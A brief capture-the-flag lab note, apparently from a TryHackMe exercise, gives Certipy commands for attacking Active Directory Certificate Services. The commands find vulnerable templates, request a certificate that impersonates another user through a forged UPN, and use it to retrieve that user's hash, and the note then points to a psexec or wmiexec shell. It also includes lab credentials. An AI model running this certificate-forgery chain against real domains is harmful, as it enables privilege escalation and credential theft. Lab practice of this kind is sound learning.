
https://github.com/ly4k/Certipy
https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage


```bash title="Find vulnerabilities in ADCS after initial set of credentials"
certipy-ad find -u 'SUSANNA_MCKNIGHT@local.thm' -p 'CHANGEME2023!' -dc-ip $target -vulnerable
```

![[Pasted image 20250811231216.png]]


```bash title="Forge certificate"
certipy-ad -debug req -dc-ip $target -username 'SUSANNA_MCKNIGHT' -password 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -target 'labyrinth.thm.local' -template 'ServerAuth' -upn 'BRADLEY_ORTIZ@THM.LOCAL'
```


```bash title="Get hash for specific users"
certipy-ad -debug auth -pfx 'bradley_ortiz.pfx' -dc-ip $target
```


get shell with psexec(wmiexec) next


https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

